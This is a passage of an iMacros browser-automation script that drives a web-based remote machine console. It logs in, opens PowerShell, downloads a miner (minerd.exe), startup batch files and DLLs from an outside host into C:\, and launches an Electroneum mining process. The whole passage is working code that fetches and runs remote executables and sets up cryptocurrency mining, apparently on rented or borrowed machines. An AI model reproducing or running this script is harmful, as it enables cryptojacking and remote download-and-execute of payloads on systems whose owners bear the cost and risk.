		// login
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:ctlAltDel");
		iimPlay("CODE:WAIT SECONDS = 3");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pastePassword");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 8");
		
		// cd C:/
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="powershell -NoExit -Command \'Set-Location C: \' "');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 2");

		

		// downoad File

		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="$client = new-object System.Net.WebClient ;"');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 3");
		
		var myStringArray = ["etn_startup.exe","libcurl.dll" , "libeay32.dll" , "libgcc_s_seh-1.dll" , "libstdc++-6.dll" , "libwinpthread-1.dll" , "minerd.exe" , "ssleay32.dll" , "star-etn.bat" ,"star-etnFromC.bat" , "zlib1.dll"];
		var arrayLength = myStringArray.length;
		var longstring = '';
		for (var i = 0; i < arrayLength; i++) {
			
			longstring = longstring + '$client.DownloadFile(\"http://thuenhahn.com/temp/'+myStringArray[i]+'\",\\"C:\\'+myStringArray[i]+'\\");';
		}
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="'+longstring+'"');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 35");
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 40");
		
		
		// open cmd
		
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="start cmd"');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 2");

		// cd C:/
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="cd C://"');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 2");

		// runmine
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="etn_startup"');

		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 2");
